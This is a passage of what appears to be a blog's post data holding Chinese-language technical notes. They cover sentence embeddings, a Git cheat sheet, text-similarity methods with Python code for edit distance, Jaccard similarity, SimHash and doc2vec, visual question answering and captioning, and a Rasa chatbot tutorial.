Word2vec使用子采样（sub-sampling）技术对单词w进行下采样，概率与1 /√p（w）成正比，其中p（w）是单词w的边缘概率。这种启发式方法不仅可以加快训练速度，而且学习了更常见的单词表示形式。 该文章模型中，对词向量进行隐式加权，因此在一些场景下可以更好的利用文档的统计信息。 Method latent variable generative model for text image \\(c_t\\)为来自latent random walk的句子向量。使用MAP方法预测下一个（time t）生成的词的概率。 Improved Random Walk model. image 添加两个smooth项。\\(p(w)\\): 即使单词的向量与\\(c_s\\)的内积非常低，单词也可能出现。\\(c_0\\): 与语法相关的sentence向量校正项，保证最重要的向量维度处于主导地位。它提高了与\\(c_0\\)方向相近的单词在模型中的共现概率。 Computing the sentence embedding 假设\\(Z\\)是一个常量 image 越常见的word \\(w\\)，权重\\(a/(p(w) +a)\\)就越小，可以使embedding专注于具有代表性的词。 为了删去没有代表性的信息，计算\\(c_0\\)的方向为矩阵的第一个主成分（不进行 centralizing）。 image Notes: PMI: Pointwise Mutual Information \\[ PMI = log \\frac{p(u, v)}{p(u)p(v)} \\] pPMI = max(0,PMI): positive Pointwise Mutual Information","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"sentence embedding","slug":"sentence-embedding","permalink":"https://racleray.github.io/tags/sentence-embedding/"}]},{"title":"Git sheet","slug":"Git-sheet","date":"2020-07-07T11:13:39.000Z","updated":"2023-08-07T11:54:31.029Z","comments":true,"path":"posts/cdcb5601.html","link":"","permalink":"https://racleray.github.io/posts/cdcb5601.html","excerpt":"Git cheat sheet","text":"basic 12345678$ git status # 检查文件当前的状态$ git add [文件名] # 追踪新的文件$ git diff --cached # 若要看已经暂存起来的文件和上次提交时的快照之间的差异$ git commit -m \"Story 182: Fix benchmark\" # 用一行命令提交更新$ git commit -a -m 'added new benchmarks' # 跳过add命令直接提交$ git rm --cached log.log # 从git仓库中删除不小心追踪的文件（用于gitignore之前追踪的文件） $ git mv file_from file_to # 移动文件/重命名文件$ git log ​ # 查看历史操作 关联远程仓库 1234567891011121314$ git init # 初始化这个本地的文件夹为一个Git可以管理的仓库$ git remote add origin https://[地址] # 将本地的仓库和远程的仓库进行关联$ git pull &lt;远程主机名&gt; &lt;远程分支名&gt;:&lt;本地分支名&gt; # git pull origin master:master$ git add$ git commit -m$ git push -u origin master(首次关联加u，后续不用)$ git push origin master$ git clone https://github.com/。。。$ git rm --cached \"文件路径\"，不删除物理文件，仅将该文件从缓存中删除$ git rm --f \"文件路径\"，不仅将该文件从缓存中删除，还会将物理文件删除（不会回收到垃圾桶）$ git commit -m \"delete file\"$ git push branch 123456789101112131415 git branch # 查看分支$ git branch new-branch-name # 创建新分支$ git branch -v # 查看各分支最后一个提交对象$ git branch --merged # 查看已经merge过的分支$ git branch --no-merged # 尚未merge的分支$ git branch -d testing # 删除掉分支(如果还没有merge,会出现错误,-D可以强制删除)$ git branch -a # 查看所有分支（包括远程服务器）$ git push [远程仓库名] [本地分支名]:[远程分支名] # 推送本地分支到远程分支 # 如果本地分支名为空，则会直接删除远程分支名$ git checkout -b iss53 # 新建分支并切换到新分支 =$ git branch iss53; git checkout iss53$ git reset 版本号$ git cherry-pick [id] # 合并某一个单独的commit# 创建并在branch上修改之后，在代码仓库界面，可以在pull request选项中，选择是否merge pull request，合并该分支的修改 organization 1234567# 远程创建organization：New organization# organization中选择Team，创建管理小组# 新建代码仓库，归属于organization，在setting中设置Team权限，合作者权限# pull request中加入@TeamName可以通知所有人 opensource 123456789101112131415# 添加LICENSE，可使用template模板创建# 贡献开源项目，可以首先查看issue中是否有已经出现的相同问题# fork仓库，然后git clone到本地$ git checkout -b fix-bug # 新建分支并切换到新分支# 修改$ git add .$ git commit -m \"message\"$ git push origin fix-bug# 在fork项目中 点击New pull request，向原项目提交更改 log 12$ git log --pretty=format:\"%h - %an, %ar : %s\" # 用特性的format查看log$ git log --graph # 用图表的形式显示git的合并历史 config 1234$ git config --global user.name \"John Doe\" # 配置用户名 ！仅第一次必须$ git config --global user.email je@example.com # 配置电邮 ！仅第一次必须$ git config --list # 查看配置信息$ git config --global alias.stash-unapply '!git stash show -p | git apply -R' # 设置别名 stash 123456$ git stash # 储藏当前工作内容$ git stash list # 查看所有已经储藏的内容$ git stash apply [stash@&#123;0&#125;] # 在当前工作区应用储藏的内容，默认最新$ git stash apply --index # 在当前工作区应用储藏的内容，并保持之前暂存区的状态$ git stash drop # 删除一个储藏$ git stash pop # 弹出一个储藏 rejected问题 12345# 通常是因为在远程仓库中更改了，而本地没有修改，造成冲突。一般先在本地先pull再push，不会出现这样的问题。$ git fetch origin$ git rebase origin/master$ git push ssh密匙问题，没有权限访问仓库 123456789# 重新设置ssh keygit config --global user.name 'racleray'git config --global user.email 'racleme@outlook.com'ssh-keygen -t rsa -C 'racleme@outlook.com'# 在home目录找 .ssh/id_rsa.pub# 在github网站的SSH keys添加new key","categories":[{"name":"Tools","slug":"Tools","permalink":"https://racleray.github.io/categories/Tools/"},{"name":"git","slug":"Tools/git","permalink":"https://racleray.github.io/categories/Tools/git/"}],"tags":[{"name":"git","slug":"git","permalink":"https://racleray.github.io/tags/git/"}]},{"title":"文本相似性深度学习方法","slug":"文本相似性深度学习方法","date":"2020-07-07T10:49:20.000Z","updated":"2023-08-07T11:54:31.045Z","comments":true,"path":"posts/bad75bd3.html","link":"","permalink":"https://racleray.github.io/posts/bad75bd3.html","excerpt":"记录文本语义匹配模型。包括 InferSent、DSSM 等常见模型。","text":"基于深度学习的语义匹配方法一般有两种类型： Representation-based Match：简单，速度快。 Interaction-based Match：计算相对复杂，参数空间也更大。 Representation-based Representation-based Match句子相似度计算的一般训练流程如下： 准备同义句数据集（比如，The Paraphrase Database，ParaNMT-50M）； 选择模型结构（比如，Word Averaging，BiLSTM Averaging等）； Word Averaging模型：平均句子中的所有词向量作为句子语义的表达 BiLSTM Averaging模型：合并前向和反向LSTM编码得到的隐向量作为句子语义的表达 相对进阶一点的模型有InferSent，DSSM，CDSSM 选择负样本： 从当前batch中寻找与当前句子意义（根据当前模型判断）最不相近 的句子。 或者，Mega-batching：从更大的样本（合并多个mini batches）中寻找 意义较远的句子。 优化目标：hinge loss \\[ \\begin{array}{l} \\min _{W_{c}, W_{w}} \\frac{1}{|S|}\\left(\\sum_{\\left\\langle s_{1}, s_{2}\\right\\rangle \\in S} \\max \\left(0, \\delta-\\cos \\left(g\\left(s_{1}\\right), g\\left(s_{2}\\right)\\right)\\right.\\right. \\\\ \\left.+\\cos \\left(g\\left(s_{1}\\right), g\\left(t_{1}\\right)\\right)\\right)+\\max \\left(0, \\delta-\\cos \\left(g\\left(s_{1}\\right), g\\left(s_{2}\\right)\\right)\\right. \\\\ \\left.\\left.+\\cos \\left(g\\left(s_{2}\\right), g\\left(t_{2}\\right)\\right)\\right)\\right)+\\lambda_{c}\\left\\|W_{c}\\right\\|^{2}+\\lambda_{w}\\left\\|W_{w_{\\text {initial}}}-W_{w}\\right\\|^{2} \\end{array} \\] s之间正样本相似度要尽量接近\\(\\delta\\)，与负样本t之间相似度要尽量大。同时在正则化中加入词向量变化约束，计算之后的词向量不能和初始化使用的Glove（或其他）词向量相差过大。 InferSent ​ InferSent Git ​ 给定两个句子，预测两个句子之间的关系 (entailment隐含, contradiction互斥, neutral无关)，即预测三种概率。 image ​ encoder作为语句特征的提取器。 ​ 训练时，若只为学习sentence representation，线性分类器也许会得到比较好的效果。为了达到更好的分类效果，可以采用更复杂的非线性分类器。 DSSM(Deep Structured Semantic Model) ​ 微软研究院使用，用户搜索的关键词和最终点开的网页标题组成的数据，训练相似度计算模型。DSSM将语句映射到语义空间的连续表示，计算相似性。 Word Hashing • 用于解决单词表和out of vocabulary问题 • 把单词(e.g. good)前后加上# (#good#) • 然后取所有的trigram (#go, goo, ood, od#)，表示成bag of trigram 向量 ​ 原词表转换为了Compact representation，大小会变小，节省了空间。 ​ 对拼写错误有一定鲁棒性。 ​ 在大型NLP任务中可以轻松使用。 模型 image image 训练目标： image CDSSM image ​ convolutional layer捕捉了局部上下文的含义。那么相同单词在不同上下文中的多义性，就可能通过模型捕捉。 ​ global pooling捕捉语句整体的意图。实验中，一般情况下max pooling能够较准确地提取出整体语义。 Recurrent DSSM image ​ 对比Seq2Seq，DSSM倾向于在语句语义空间内优化，而Seq2Seq更倾向于在word-level进行学习优化。 评价指标 ​ NDCG a measure of ranking quality. ​ 两个基本假设： 相关度越高，排名越高。 高度相关的排名高于部分相关，部分相关的排名高于无关。 Cumulative Gain image ​ \\(rel_i\\) -- 是相关度分数，比如，第i个结果高度相关为5分 Discounted Cumulative Gain image ​ 对高度相关的结果出现在ranking靠后位置时，进行惩罚。 ​ 另一个形式为： image ​ 这个形式相对比较常用。 NDCG：normalized discounted cumulative gain image image Example ​ 令0 -- 不相关，1，2 -- 不同程度部分相关，3 -- 高度相关。相关性算法排序了前6个结果，降序： image ​ 而用户数据中的相关性分数Ground Truth为，每个位置index代表一个语句： image ​ Cumulative Gain，简单相加： image ​ Discounted Cumulative Gain，DCG结果为： image image ​ NDCG的IDCG，为期望的相关性排列顺序，即期望的最优输出： image image image DSSM的其他应用 训练word embedding：上下文与中心词的语义相似性 Knowledge Base Embedding学习 QA Information Retrieval Contextual Entity Ranking Interaction-based Matching DRMM：Deep Relevance Matching Model image ​ 输入网络的特征是处理过的，把matching分数转化为histogram统计特征： image ​ 即q的term与d计算cosine similarity，不是乘法，然后统计多个不同区间的相似度的统计分布。 Term Gating Network ​ Term Gating Network用于计query中每个term的weight。 image Hinge loss image","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"text similarity","slug":"text-similarity","permalink":"https://racleray.github.io/tags/text-similarity/"},{"name":"DSSM","slug":"DSSM","permalink":"https://racleray.github.io/tags/DSSM/"},{"name":"CDSSM","slug":"CDSSM","permalink":"https://racleray.github.io/tags/CDSSM/"}]},{"title":"文本相似性","slug":"文本相似性","date":"2020-07-07T10:19:49.000Z","updated":"2023-08-07T11:54:31.044Z","comments":true,"path":"posts/1074fc0d.html","link":"","permalink":"https://racleray.github.io/posts/1074fc0d.html","excerpt":"记录传统的文本相似性匹配方法（编辑距离、SimHash等），与word2vec等方法。","text":"基于字符串匹配的文本相似度 Hamming distance ​ 两个相同长度的字符串，有多少个位置是不同的token. e.g., d(cap, cat) = 1 编辑距离 ​ 给定两个句子，最少需要经过多少步操作（删除，添加，替换）能够从一个句子转化成另一个句子 1234567891011121314151617181920212223def editDistDP(s1, s2): \"\"\"编辑距离计算 params：文本1，string 文本2，string \"\"\" m = len(s1.strip()) n = len(s2.strip()) # 创建一张表格记录所有子问题的答案 dp = [[0 for x in range(n+1)] for x in range(m+1)] # 从上往下填充DP表格 for i in range(m+1): for j in range(n+1): if i == 0 or j == 0: dp[i][j] = max(i, j) # 如果两个字符串结尾字母相同，距离不变 elif s1[i-1] == s2[j-1]: dp[i][j] = dp[i-1][j-1] # 如果结尾字母不同，那我们就需要考虑三种情况，取最小的编辑距离 # 替换，添加，删除 else: dp[i][j] = 1 + min(dp[i-1][j-1], dp[i][j-1], dp[i-1][j]) return dp[m][n] Jaccard Similarity ​ 给定两句话，把两句话中出现的单词取交集和并集，交集和并集的大小之商即为Jaccard Similarity。 ​ Jaccard Similarity只考虑单词出现与否，忽略每个单词的含义，忽略单词的顺序，没有考虑单词出现的次数。 123456def jaccard_sim(s1, s2): \"\"\"交并比\"\"\" a = set(s1.strip().split()) b = set(s2.strip().split()) c = a.intersection(b) return float(len(c) / (len(a) + len(b) - len(c))) 基于文本特征的相似度计算方法 SimHash 选择一个hashsize，例如32 V = [0] * 32 把一段text变成features (shingles) 把每个feature都hash成32位 对于每个hash的每个位置，如果位置上是1就把V[i]加1，如果不是就把V[i]减1 最后，如果V[i]&gt;0就设为1，否则设为0，得到的V就是我们想要的simhash值 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123import reimport sysimport hashlibimport loggingimport numbersimport collectionsfrom itertools import groupbydef _hashfunc(x): # 使用的hash函数 return int(hashlib.md5(x).hexdigest(), 16)class Simhash(object): def __init__(self, value, f=64, reg=r'[\\w\\u4e00-\\u9fcc]+', hashfunc=None, log=None): \"\"\" `f` is the dimensions of fingerprints `reg` is meaningful only when `value` is str and describes what is considered to be a letter inside parsed string. Regexp object can also be specified (some attempt to handle any letters is to specify reg=re.compile(r'\\w', re.UNICODE)) `hashfunc` accepts a utf-8 encoded string and returns a unsigned integer in at least `f` bits. \"\"\" self.f = f self.reg = reg self.value = None if hashfunc is None: self.hashfunc = _hashfunc else: self.hashfunc = hashfunc if log is None: self.log = logging.getLogger(\"simhash\") else: self.log = log if isinstance(value, Simhash): self.value = value.value elif isinstance(value, str): # print(\"build by text\") self.build_by_text(str(value)) elif isinstance(value, collections.Iterable): self.build_by_features(value) elif isinstance(value, numbers.Integral): self.value = value else: raise Exception('Bad parameter with type &#123;&#125;'.format(type(value))) def __eq__(self, other): \"\"\" Compare two simhashes by their value. :param Simhash other: The Simhash object to compare to \"\"\" return self.value == other.value def _slide(self, content, width=4): return [ content[i:i + width] for i in range(max(len(content) - width + 1, 1)) ] def _tokenize(self, content): content = content.lower() content = ''.join(re.findall(self.reg, content)) ans = self._slide(content) return ans def build_by_text(self, content): features = self._tokenize(content) features = &#123;k: sum(1 for _ in g) for k, g in groupby(sorted(features))&#125; return self.build_by_features(features) def build_by_features(self, features): \"\"\" 核心方法 `features` might be a list of unweighted tokens (a weight of 1 will be assumed), a list of (token, weight) tuples or a token -&gt; weight dict. \"\"\" v = [0] * self.f # 初始化 [0,0,0,...] masks = [1 &lt;&lt; i for i in range(self.f)] # 二进制下[1000, 0100, 0010, ...] if isinstance(features, dict): features = features.items() for f in features: if isinstance(f, str): h = self.hashfunc(f.encode('utf-8')) # hash成32位 w = 1 else: assert isinstance(f, collections.Iterable) h = self.hashfunc(f[0].encode('utf-8')) w = f[1] for i in range(self.f): # mask位置为1，则vi加上w，否则减去w v[i] += w if h &amp; masks[i] else -w ans = 0 for i in range(self.f): if v[i] &gt; 0: # 如果大于0，就把那一位变成1 ans |= masks[i] self.value = ans def distance(self, another): \"\"\"计算两个vector有多少个位置不一样\"\"\" assert self.f == another.f x = (self.value ^ another.value) &amp; ((1 &lt;&lt; self.f) - 1) # (1 &lt;&lt; self.f) - 1: self.f个位的1 ans = 0 while x: # bin(x)不全为0，即x非0 ans += 1 x &amp;= x - 1 # bin计算，每算一次，低位的第一个1变为0 return ans 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293class SimhashIndex(object): def __init__(self, objs, f=64, k=2, log=None): \"\"\" 使用Simhash进行相似字符串检索 `objs` is a list of (obj_id, simhash) obj_id is a string, simhash is an instance of Simhash `f` is the same with the one for Simhash `k` is the tolerance \"\"\" self.k = k self.f = f count = len(objs) if log is None: self.log = logging.getLogger(\"simhash\") else: self.log = log self.log.info('Initializing %s data.', count) self.bucket = collections.defaultdict(set) for i, q in enumerate(objs): if i % 10000 == 0 or i == count - 1: self.log.info('%s/%s', i + 1, count) self.add(*q) def get_near_dups(self, simhash): \"\"\" `simhash` is an instance of Simhash return a list of obj_id, which is in type of str \"\"\" assert simhash.f == self.f ans = set() for key in self.get_keys(simhash): dups = self.bucket[key] self.log.debug('key:%s', key) if len(dups) &gt; 200: self.log.warning('Big bucket found. key:%s, len:%s', key, len(dups)) for dup in dups: sim2, obj_id = dup.split(',', 1) sim2 = Simhash(int(sim2, 16), self.f) d = simhash.distance(sim2) if d &lt;= self.k: ans.add(obj_id) return list(ans) def add(self, obj_id, simhash): \"\"\" `obj_id` is a string `simhash` is an instance of Simhash \"\"\" assert simhash.f == self.f for key in self.get_keys(simhash): v = '%x,%s' % (simhash.value, obj_id) self.bucket[key].add(v) def delete(self, obj_id, simhash): \"\"\" `obj_id` is a string `simhash` is an instance of Simhash \"\"\" assert simhash.f == self.f for key in self.get_keys(simhash): v = '%x,%s' % (simhash.value, obj_id) if v in self.bucket[key]: self.bucket[key].remove(v) @property def offsets(self): \"\"\" You may optimize this method according to &lt;http://www.wwwconference.org/www2007/papers/paper215.pdf&gt; \"\"\" return [self.f // (self.k + 1) * i for i in range(self.k + 1)] def get_keys(self, simhash): for i, offset in enumerate(self.offsets): if i == (len(self.offsets) - 1): m = 2**(self.f - offset) - 1 else: m = 2**(self.offsets[i + 1] - offset) - 1 c = simhash.value &gt;&gt; offset &amp; m yield '%x:%x' % (c, i) def bucket_size(self): return len(self.bucket) 123456789101112131415161718192021222324data = &#123; 1: u'How are you? I am fine. blar blar blar blar blar Thanks.', 2: u'How are you i am fine. blar blar blar blar blar Thanks.', 3: u'This is a simhash test',&#125;# 序号和hash值保存objs = [(str(k), Simhash(v)) for k, v in data.items()]# 建立SimhashIndex对象，`k` is the toleranceindex = SimhashIndex(objs, k=10)print(\"相似文本Bucket数量：\", index.bucket_size())# 输入需要查找的文本的hash值，get_near_dups获取相似文本s1 = Simhash(u'How are you i am fine. blar blar blar blar blar thanks')print(\"相似文本id：\", index.get_near_dups(s1))# 加入data文本index.add('4', s1)print(\"相似文本id：\", index.get_near_dups(s1))s2 = Simhash(u'How are you i am fine. blar blar blar thanks')index.add('5', s2)print(\"相似文本id：\", index.get_near_dups(s1)) Cosine Similarity 将文本转化为feature vectors。（bag of words或者TF-IDF） 利用feature vectors计算文本相似度 1234567891011from sklearn.feature_extraction.text import CountVectorizerfrom sklearn.metrics.pairwise import cosine_similarity# bowdef bow_cosine(s1, s2): \"\"\"返回值为ndarray类型\"\"\" vectorizer = CountVectorizer() vectorizer.fit([s1, s2]) # 词频统计词表 X = vectorizer.transform([s1, s2]) print(X.toarray()) return cosine_similarity(X[0], X[1]) 12345678from sklearn.feature_extraction.text import TfidfVectorizerdef tfidf_cosine(s1, s2): vectorizer = TfidfVectorizer() vectorizer.fit([s1, s2]) X = vectorizer.transform([s1, s2]) print(X.toarray()) return cosine_similarity(X[0], X[1]) Word2Vec ​ 利用句子中的单词做Word Averaging计算句子相似度。 12345678910111213141516import gensimimport gensim.downloader as apiimport numpy as npfrom sklearn.metrics.pairwise import cosine_similaritymodel = api.load(\"glove-twitter-25\")def wordavg(model, words): \"\"\"计算句子每个词的平均词向量\"\"\" res = np.mean([model.get_vector(w) for w in words if w in model.vocab], 0) return ress1_vec = wordavg(model, s1.lower().split())s2_vec = wordavg(model, s2.lower().split())cosine_similarity(s1_vec.reshape((1, -1)), s2_vec.reshape((1, -1))) Doc2Vec ​ 类似word2vec，只是在输入时加入一个全局的doc vec和word vec一起输入，doc vec由doc id和doc matrix相乘生成。计算方法有两种，DM(Distributed Memory)算法类似CBOW，DBOW(Distributed Bag of Words)类似Skip gram(只输入doc vec预测随机抽取词的概率分布)。 gensim官方文档：https://radimrehurek.com/gensim/models/doc2vec.html 1234567891011121314151617181920212223import gensim.models as gfrom gensim.corpora import WikiCorpusimport loggingfrom hanziconv import HanziConvdocvec_size=192class TaggedWikiDocument(object): def __init__(self, wiki): self.wiki = wiki self.wiki.metadata = True def __iter__(self): import jieba # tags信息是word2vec没有的，辅助训练 for content, (page_id, title) in self.wiki.get_texts(): yield g.doc2vec.LabeledSentence(words=[w for c in content for w in jieba.cut(HanziConv.toSimplified(c))], tags=[title])def my_function(): zhwiki_name = './data/zhwiki-latest-pages-articles.xml.bz2' wiki = WikiCorpus(zhwiki_name, lemmatize=False, dictionary=&#123;&#125;) documents = TaggedWikiDocument(wiki) model = g.Doc2Vec(documents, dm=0, dbow_words=1, size=docvec_size, window=8, min_count=19, iter=5, workers=8) model.save('data/zhiwiki_news.doc2vec') 模型的推断。根据输入文档，在doc matrix的中infer出最后结果，要指定infer_epoch。 123456789101112131415161718192021222324252627282930313233343536import gensim.models as gimport codecsimport numpy as npdef SimlarityCalu(Vector1,Vector2): Vector1Mod=np.sqrt(Vector1.dot(Vector1)) Vector2Mod=np.sqrt(Vector2.dot(Vector2)) if Vector2Mod!=0 and Vector1Mod!=0: simlarity=(Vector1.dot(Vector2))/(Vector1Mod*Vector2Mod) else: simlarity=0 return simlarity#parametersmodel='toy_data/model.bin'test_docs='toy_data/t_docs.txt'output_file='toy_data/test_vectors.txt'#inference hyper-parametersstart_alpha=0.01infer_epoch=1000#load modelm = g.Doc2Vec.load(model)test_docs = [x.strip().split() for x in codecs.open(test_docs, 'r', 'utf-8').readlines()]#infer test vectorsoutput = open(output_file, 'w')a=[]for d in test_docs: output.write(' '.join([str(x) for x in m.infer_vector(d, alpha=start_alpha, steps=infer_epoch)]) + '\\n' ) a.append(m.infer_vector(d, alpha=start_alpha, steps=infer_epoch))output.flush()output.close()print(SimlarityCalu(a[0],a[1]))","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"text similarity","slug":"text-similarity","permalink":"https://racleray.github.io/tags/text-similarity/"},{"name":"word2vec","slug":"word2vec","permalink":"https://racleray.github.io/tags/word2vec/"},{"name":"doc2vec","slug":"doc2vec","permalink":"https://racleray.github.io/tags/doc2vec/"},{"name":"SimHash","slug":"SimHash","permalink":"https://racleray.github.io/tags/SimHash/"}]},{"title":"Vision to text","slug":"Vision-to-text","date":"2020-07-07T09:55:15.000Z","updated":"2023-08-07T11:54:31.035Z","comments":true,"path":"posts/88e9ab16.html","link":"","permalink":"https://racleray.github.io/posts/88e9ab16.html","excerpt":"","text":"视觉问答任务的定义是对于一张图片和一个跟这幅图片相关的问题，机器需要根据图片信息对问题进行回答。 输入：一张图片和一个关于图片信息的问题，常见的问题形式有选择题，判断题 输出：挑选出正确答案 ​ 视觉问答任务本质上是一个多模态的研究问题。这个任务需要我们结合自然语言处理（NLP）和计算机视觉（CV)的技术来进行回答。 自然语言处理（NLP） 举一个在NLP领域常见的基于文本的Q&amp;A问题：how many bridges are there in Paris? 一个NLP Q&amp;A 系统需要首先识别出这是一个什么类型的问题，比如这里是一个“how many” 关于计数的问题，所以答案应该是一个数字。之后系统需要提取出哪个物体（object）需要机器去计数，比如这里是 “bridges“。最后需要我们提取出问题中的背景（context），比如这个问题计数的限定范围是在巴黎这个城市。 当一个Q&amp;A系统分析完问题，系统需要根据知识库（knowledge base）去得到答案。 机器视觉（CV) VQA区别于传统的text QA在于搜索答案和推理部分都是基于图片的内容。所以系统需要进行目标检测（object detection），再进行分类（classification），之后系统需要对图片中物体之间的关系进行推理。 VQA Notes 基于图像信息和文本信息匹配的VQA 通常，一个VQA系统包含了以下三个步骤： 抽取问题特征 抽取图片特征 结合图片和问题特征去生成答案 image image 基于注意力（attention）的VQA ​ VQA方案是使用位置注意力（spatial attention）去生成关于区域（region）的位置特征，并训练一个CNN网络。一般有两种方法去获得一张图片关于方位的区域。 划分成网格状（grid），并根据问题与图片特征去预测每一个网格的attention weight，将图片的CNN的feature通过加权求和的方式得到attention weighted feature，再通过attention weighted feature发现相对比较重要的区域 目标识别的方式生成很多bounding box。 根据生成的区域（region），使用问题去找到最相关的区域，并利用这些区域去生成答案。 Stacked Attention Stacked Attention，多次重复question-image attention。 image 图片使用CNN 编码 \\[\\phi = CNN(I)\\] 问题使用LSTM编码 \\[s= LSTM(E_q)\\] Stacked Attention \\[\\alpha_{c,l} \\propto \\exp F_c(s, \\phi_l) ,~~ \\sum_{l=1}^L \\alpha_{c,l}=1, ~~ x_c = \\sum_l \\alpha_{c,l}\\phi_l\\] classifier, 其中G=[G_1, G_2, ..., G_M]是两层的全连接层 \\[P(a_i|I,q) \\propto \\exp G_i(x,s),~~ x=[x_1, x2,...,x_C]\\] Image captioning 基本模型 ​ 常见的image captioning 系统是由一个CNN+RNN的编码解码模型完成。类比一下machine translation系统，通常由一个RNN encoder + RNN decoder组成。 图像编码 ​ Vinyals et al. (2014) Show and Tell: A Neural Image Caption Generator 这篇文章将seq2seq模型中的LSTM encoder换成CNN encoder，用于提取图片的信息，得到一个固定长度的内容向量（context vector），之后通过一个RNN decoder，将信息使用文字的方式解码出来。 ​ 结合注意力机制 - Kelvin et al. (2014) Show, Attend and Tell: Neural Image Caption Generation with Visual Attention 类比人看图说话：当人在解说一幅图片的时候，每预测一个字，会关注到图片上的不同位置。 在解码器预测文字的时候，会关注到跟当前文字内容和图片最相关的位置。 注意力机制 一张图片的卷积层中的向量有14x14=196个feature maps \\(a_i, i=1...196\\)，每个feature map对应于每个图片中不同的高亮位置。 注意力机制通过计算每个feature map与当前的hidden state计算两者之间的相关度，这里的hidden state \\(h_{t-1}\\) 总结了已经生成的1到t-1个单词的内容。 \\[e_{ti}=f_{att}(a_i, h_{t-1}) \\\\ \\alpha_{ti} = {\\exp(e_{ti}) \\over \\sum_{k=1}^L \\exp(e_{tk}) }\\] 之后通过加权求和得到注意力内容向量 \\(\\hat{z}_t\\)。 \\[\\hat{z}_t=\\phi(\\{a_i\\}, \\{\\alpha_i\\})\\] 通过将196个feature maps求平均值去初始化LSTM中的 memory cell \\(c_0, h_0\\) 根据图片及已经生成的部分单词，去预测下一个单词 \\[c_0 = f_{init,c}({1\\over L} \\sum_i^L a_i) \\\\ h_0 = f_{init,h}({1\\over L} \\sum_i^L a_i) \\\\ p(y_t|a, y_1^{t-1}) \\propto \\exp(L_o (E y_{t-1} + L_h h_t + L_z \\hat{z}_t))\\] show attention and tell beam search 优化 ​ 每次预测下一个单词的时候，计算当前所有路径的log-likelihood并进行排序, 只保留log-likelihood 最大值的K个beams。 目标识别 ​ Fang et al 2014， From Captions to Visual Concepts and Back, 提供了另一个image caption系统的思路。 预测文字： 使用一个CNN去做目标识别，并且根据bounding box生成可能出现的文字 生成句子：通过一个统计语言模型，生成很多个可能的句子集合 重新排序已经生成的句子： 通过学习一个Deep Multimodal Similarity Model （DMSM）去重新排序所有可能的句子集合，取最高分数的句子作为系统输出。 评估指标 常见的image captioning 系统的评估指标使用的是 BLEU， 是常见的机器翻译系统的评估指标，计算的是一句预测的文字与人类标注的参考文字之间的n-gram 重合度（overlap）。 METEOR， 也是常见的机器翻译系统的评估指标，其通过建立一个短语词表（phrase table），考虑了输出文本是否使用了相似短语。 CIDEr， 考虑了句子中的文字与图片的相关性 ROUGE-L，是text summarization的评估指标 SPICE 是专门设计出来用于 image caption 问题的。全称是 Semantic Propositional Image Caption Evaluation。","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"visual text","slug":"visual-text","permalink":"https://racleray.github.io/tags/visual-text/"}]},{"title":"Rasa Notes","slug":"Rasa-Notes","date":"2020-07-07T09:47:25.000Z","updated":"2023-08-07T11:54:31.034Z","comments":true,"path":"posts/1b390165.html","link":"","permalink":"https://racleray.github.io/posts/1b390165.html","excerpt":"RASA工具的简短新手tutorial。","text":"rasa_nlu训练数据的生成 对话系统的冷启动都会遇到这样的问题，没有数据。 使用chatito来生成rasa_nlu意图识别需要的数据。这个数据需要反反复复的修改和完善。 Chatito doc 在产生训练数据的时候需要确定的nlu的意图和实体类别，需要在domain.yml文件中配置intents和entities。 官方DOC https://rasa.com/docs/rasa/core/policies/ mini rasa tutorial 创建一个新的项目 查看NLU培训数据 定义模型配置，写下第一个故事Story 定义这个故事story的作用域domain 训练模型 测试你写好的助手 创建新项目 路径指向一个新的空文件夹 cd path/to/a/blank/folder 在这个文件夹里面创建新的rasa项目 rasa init --no-prompt 文件夹中将会生成以下的文件： init.py 空文件用于定位 actions.py 用于定义动作（自定义脚本代码） config.yml 配置NLU和core模型 credentials.yml 连接到其他服务器的细节（不常用） data/nlu.md 自定义NLU训练数据 data/stories.md 自定义stories domain.yml 助手的定义域domian endpoints.yml 连接到fb message等的轨道（不常用） models/.tar.gz 模型及其参数文件 自定义的NLU模型 自定义NLU训练数据 1cat data/nlu.md 自定义stories 查看写好的stories 1cat data/stories.md 自定义动作acitons actions有两种类型： 直接回复，在domain.yml中定义templete 自定义操作，在aciton.py文件中添加 自定义domain 1cat domain.yml intents：用户意图 entities：实体 slots：槽 actions：助手说和做的事情 templates：助手根据actions具体要做的事情 定义模型配置 配置文件config.yml police: core，决定对话状态跟踪策略 pipeline: NLU，Natural Language Understanding and Intent Classification，理解当前用户输入，提取意图。 12345678910language: \"zh\"pipeline: - name: \"JiebaTokenizer\"policies: - name: FallbackPolic fallback_action_name: 'action_default_fallback' nlu_threshold: 0.5 core_threshold: 0.3 训练模型 使用data下面的训练数据 -- core/ -- stories.md -- nlu/ -- nlu.json 自动对模型进行训练，训练好的模型将会被打上时间戳time stamp作为新的模型，保存在models目录下面 rasa train SHELL启动 rasa shell 可视化界面 rasa x","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"rasa","slug":"rasa","permalink":"https://racleray.github.io/tags/rasa/"}]},{"title":"ChatBot Simple Notes","slug":"ChatBot-Notes","date":"2020-07-07T09:42:09.000Z","updated":"2023-08-07T11:54:31.028Z","comments":true,"path":"posts/fc0185e8.html","link":"","permalink":"https://racleray.github.io/posts/fc0185e8.html","excerpt":"粗浅的Chat Bot相关信息记录。","text":"基于检索技术的模型 VS 生成式模型 ​ 